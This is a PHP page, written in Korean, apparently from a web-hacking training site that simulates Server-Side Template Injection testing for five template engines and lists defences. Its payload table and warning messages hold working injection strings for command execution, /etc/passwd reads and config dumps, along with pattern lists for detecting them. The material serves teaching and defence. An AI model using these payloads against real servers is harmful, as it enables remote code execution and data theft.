<?php
/**
 * SSTI (Server-Side Template Injection) 취약점 테스트 페이지
 * 교육 목적으로만 사용하시기 바랍니다.
 */

session_start();
require_once '../db.php';
require_once '../utils.php';

// 로그인 확인
if (!is_logged_in()) {
    header('Location: ../login.php');
    exit();
}

$result = '';
$template_input = '';
$engine_type = 'twig';

// SSTI 공격 시뮬레이션
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['template_data'])) {
    $template_input = $_POST['template_data'];
    $engine_type = $_POST['engine'] ?? 'twig';
    
    if (empty($template_input)) {
        $result = "템플릿 데이터를 입력해주세요.";
    } else {
        // 교육 목적의 SSTI 시뮬레이션
        $dangerous_patterns = [
            'twig' => ['{{', '}}', '_self', 'dump', 'app', 'attribute'],
            'jinja2' => ['{{', '}}', '__class__', '__mro__', '__subclasses__', 'cycler'],
            'smarty' => ['{', '}', 'php', 'eval', 'system'],
            'freemarker' => ['${', '}', 'new', 'class', 'execute'],
            'velocity' => ['$', '{', '}', 'class', 'runtime']
        ];
        
        $payload_detected = false;
        $detected_patterns = [];
        
        foreach ($dangerous_patterns[$engine_type] as $pattern) {
            if (stripos($template_input, $pattern) !== false) {
                $payload_detected = true;
                $detected_patterns[] = $pattern;
            }
        }
        
        if ($payload_detected) {
            $result = "[시뮬레이션] SSTI 공격 감지됨\n";
            $result .= "템플릿 엔진: " . strtoupper($engine_type) . "\n";
            $result .= "감지된 패턴: " . implode(', ', $detected_patterns) . "\n\n";
            
            // 엔진별 특화된 경고 메시지
            switch ($engine_type) {
                case 'twig':
                    $result .= "Twig SSTI 공격 시나리오:\n";
                    $result .= "- {{_self.env.registerUndefinedFilterCallback('exec')}} - 임의 명령 실행\n";
                    $result .= "- {{dump(app)}} - 애플리케이션 정보 노출\n";
                    $result .= "- {{attribute(this,'getEvaluationContext').setClassLoader.loadClass('java.lang.Runtime')}} - 클래스 로딩";
                    break;
                    
                case 'jinja2':
                    $result .= "Jinja2 SSTI 공격 시나리오:\n";
                    $result .= "- {{''.__class__.__mro__[2].__subclasses__()}} - 클래스 탐색\n";
                    $result .= "- {{config.items()}} - 설정 정보 노출\n";
                    $result .= "- {{cycler.__init__.__globals__.os.popen('id').read()}} - 시스템 명령 실행";
                    break;
                    
                case 'smarty':
                    $result .= "Smarty SSTI 공격 시나리오:\n";
                    $result .= "- {php}echo `id`;{/php} - PHP 코드 실행\n";
                    $result .= "- {$smarty.version} - 버전 정보 노출\n";
                    $result .= "- {math equation='x+y' x=1 y=2} - 수식 처리 악용";
                    break;
                    
                case 'freemarker':
                    $result .= "FreeMarker SSTI 공격 시나리오:\n";
                    $result .= "- \${\"freemarker.template.utility.Execute\"?new()(\"id\")} - 명령 실행\n";
                    $result .= "- <#assign ex=\"freemarker.template.utility.Execute\"?new()> - 유틸리티 할당";
                    break;
                    
                case 'velocity':
                    $result .= "Velocity SSTI 공격 시나리오:\n";
                    $result .= "- \$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\") - 런타임 접근\n";
                    $result .= "- #set(\$str=\$class.inspect(\"java.lang.String\").type)\n";
                    break;
            }
        } else {
            // 안전한 템플릿 처리 시뮬레이션
            $result = "안전한 템플릿 처리 완료:\n";
            $result .= "템플릿 엔진: " . strtoupper($engine_type) . "\n";
            $result .= "입력된 템플릿이 정상적으로 처리되었습니다.\n";
            $result .= "위험한 패턴이 감지되지 않았습니다.\n\n";
            $result .= "예상 렌더링 결과: " . htmlspecialchars($template_input);
        }
    }
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSTI 취약점 테스트 - <?php echo SITE_NAME; ?></title>
    <link rel="stylesheet" href="../style.css">
    <style>
        .container {
            max-width: 900px;
            margin: 50px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .vulnerability-description, .mitigation-guide {
            background-color: #f9f9f9;
            border-left: 5px solid #f39c12;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .mitigation-guide {
            border-color: #28a745;
        }
        textarea {
            width: 100%;
            height: 150px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        select {
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin: 10px 0;
        }
        .payload-btn {
            background: #17a2b8;
            color: white;
            border: none;
            padding: 8px 12px;
            margin: 5px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        .payload-btn:hover {
            background: #138496;
        }
        .nav {
            background: #343a40;
            color: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .nav h1 {
            margin: 0;
            color: white;
        }
        .nav-links .btn {
            margin-left: 10px;
            background: #007bff;
            color: white;
            text-decoration: none;
            padding: 8px 15px;
            border-radius: 4px;
        }
        .engine-tabs {
            margin: 15px 0;
        }
        .engine-tabs button {
            background: #6c757d;
            color: white;
            border: none;
            padding: 10px 15px;
            margin-right: 5px;
            border-radius: 4px 4px 0 0;
            cursor: pointer;
        }
        .engine-tabs button.active {
            background: #007bff;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- 네비게이션 바 -->
        <nav class="nav">
            <h1>SSTI 취약점 테스트</h1>
            <div class="nav-links">
                <span>환영합니다, <?php echo safe_output($_SESSION['username']); ?>님!</span>
                <a href="../index.php" class="btn">메인으로</a>
                <a href="index.php" class="btn">웹해킹 메뉴</a>
                <a href="../logout.php" class="btn">로그아웃</a>
            </div>
        </nav>

        <div class="vulnerability-description">
            <h2>🧩 SSTI (Server-Side Template Injection) 취약점</h2>
            <p><strong>설명:</strong> 템플릿 엔진에서 사용자 입력을 안전하게 처리하지 않을 때 발생하는 취약점입니다. 
            서버 사이드 코드 실행, 파일 읽기, 시스템 명령 실행이 가능합니다.</p>
            
            <div class="engine-tabs">
                <button onclick="changeEngine('twig')" class="active" id="twig-tab">Twig (PHP)</button>
                <button onclick="changeEngine('jinja2')" id="jinja2-tab">Jinja2 (Python)</button>
                <button onclick="changeEngine('smarty')" id="smarty-tab">Smarty (PHP)</button>
                <button onclick="changeEngine('freemarker')" id="freemarker-tab">FreeMarker (Java)</button>
                <button onclick="changeEngine('velocity')" id="velocity-tab">Velocity (Java)</button>
            </div>
            
            <h3 id="payload-title">📋 Twig 테스트 페이로드:</h3>
            <div id="payload-buttons" style="margin: 10px 0;">
                <button onclick="testPayload('basic')" class="payload-btn">기본 템플릿</button>
                <button onclick="testPayload('info')" class="payload-btn">정보 노출</button>
                <button onclick="testPayload('rce')" class="payload-btn">코드 실행</button>
                <button onclick="testPayload('file')" class="payload-btn">파일 접근</button>
                <button onclick="testPayload('safe')" class="payload-btn">안전한 템플릿</button>
            </div>
        </div>

        <form method="POST">
            <label for="engine">🔧 템플릿 엔진 선택:</label><br>
            <select id="engine" name="engine">
                <option value="twig" <?php echo ($engine_type == 'twig') ? 'selected' : ''; ?>>Twig (PHP)</option>
                <option value="jinja2" <?php echo ($engine_type == 'jinja2') ? 'selected' : ''; ?>>Jinja2 (Python)</option>
                <option value="smarty" <?php echo ($engine_type == 'smarty') ? 'selected' : ''; ?>>Smarty (PHP)</option>
                <option value="freemarker" <?php echo ($engine_type == 'freemarker') ? 'selected' : ''; ?>>FreeMarker (Java)</option>
                <option value="velocity" <?php echo ($engine_type == 'velocity') ? 'selected' : ''; ?>>Velocity (Java)</option>
            </select><br><br>
            
            <label for="template_data">🎯 템플릿 데이터 입력:</label><br>
            <textarea id="template_data" name="template_data" placeholder="템플릿 데이터를 입력하세요..."><?php echo htmlspecialchars($template_input); ?></textarea><br><br>
            <input type="submit" value="템플릿 렌더링" class="btn">
        </form>

        <?php if (!empty($result)): ?>
            <div style="margin-top: 20px;">
                <h2>📊 테스트 결과:</h2>
                <pre style="background: #f1f3f4; padding: 15px; border-radius: 5px; border-left: 4px solid #dc3545;"><?php echo htmlspecialchars($result); ?></pre>
            </div>
        <?php endif; ?>

        <div class="mitigation-guide">
            <h2>🛡️ 방어 방법</h2>
            <ul>
                <li><strong>입력 검증:</strong> 사용자 입력에서 템플릿 구문 문자 필터링</li>
                <li><strong>샌드박스 모드:</strong> 템플릿 엔진의 샌드박스 기능 활성화</li>
                <li><strong>화이트리스트:</strong> 허용된 함수/메소드만 사용 가능하도록 제한</li>
                <li><strong>정적 템플릿:</strong> 동적 템플릿 생성 최소화</li>
                <li><strong>권한 분리:</strong> 템플릿 렌더링을 낮은 권한으로 실행</li>
            </ul>
        </div>

        <div style="margin-top: 20px; text-align: center;">
            <a href="index.php" class="btn">← 웹해킹 테스트 메뉴로 돌아가기</a>
        </div>
    </div>

    <script>
        const payloads = {
            twig: {
                basic: '{{ "Hello " ~ name }}',
                info: '{{ dump(app) }}',
                rce: '{{_self.env.registerUndefinedFilterCallback("exec")}}',
                file: '{{ "/etc/passwd"|file_get_contents }}',
                safe: '안녕하세요 {{ username }}님!'
            },
            jinja2: {
                basic: '{{ "Hello " + name }}',
                info: '{{ config.items() }}',
                rce: '{{\'\'.__class__.__mro__[2].__subclasses__()}}',
                file: '{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}',
                safe: '안녕하세요 {{ username }}님!'
            },
            smarty: {
                basic: '{$name}',
                info: '{$smarty.version}',
                rce: '{php}echo `id`;{/php}',
                file: '{php}echo file_get_contents("/etc/passwd");{/php}',
                safe: '안녕하세요 {$username}님!'
            },
            freemarker: {
                basic: '${name}',
                info: '${.version}',
                rce: '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
                file: '<#assign ex=\"freemarker.template.utility.ObjectConstructor\"?new()>${ex(\"java.io.FileInputStream\",\"/etc/passwd\")}',
                safe: '안녕하세요 ${username}님!'
            },
            velocity: {
                basic: '$name',
                info: '$class.inspect("java.lang.System").type.getProperty("java.version")',
                rce: '$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")',
                file: '#set($str=$class.inspect("java.lang.String").type)$str.class.forName("java.io.FileInputStream").newInstance("/etc/passwd")',
                safe: '안녕하세요 ${username}님!'
            }
        };

        function changeEngine(engine) {
            // 탭 활성화
            document.querySelectorAll('.engine-tabs button').forEach(btn => btn.classList.remove('active'));
            document.getElementById(engine + '-tab').classList.add('active');
            
            // 엔진 선택
            document.getElementById('engine').value = engine;
            
            // 제목 변경
            document.getElementById('payload-title').textContent = '📋 ' + engine.charAt(0).toUpperCase() + engine.slice(1) + ' 테스트 페이로드:';
        }

        function testPayload(type) {
            const engine = document.getElementById('engine').value;
            const payload = payloads[engine][type];
            
            if (confirm('⚠️ 교육 목적의 SSTI 테스트를 실행하시겠습니까?\n\n엔진: ' + engine + '\n유형: ' + type)) {
                document.getElementById('template_data').value = payload;
            }
        }

        // 위험 패턴 경고
        document.getElementById('template_data').addEventListener('input', function() {
            const value = this.value.toLowerCase();
            const warningPatterns = ['{{', '}}', '{', '}', '${', '__class__', 'exec', 'system', 'runtime'];
            
            let isRisky = warningPatterns.some(pattern => value.includes(pattern));
            
            if (isRisky) {
                this.style.borderColor = '#dc3545';
                this.style.backgroundColor = '#fff5f5';
            } else {
                this.style.borderColor = '#ddd';
                this.style.backgroundColor = 'white';
            }
        });

        // 엔진 변경 시 페이로드 업데이트
        document.getElementById('engine').addEventListener('change', function() {
            changeEngine(this.value);
        });
    </script>
</body>
</html>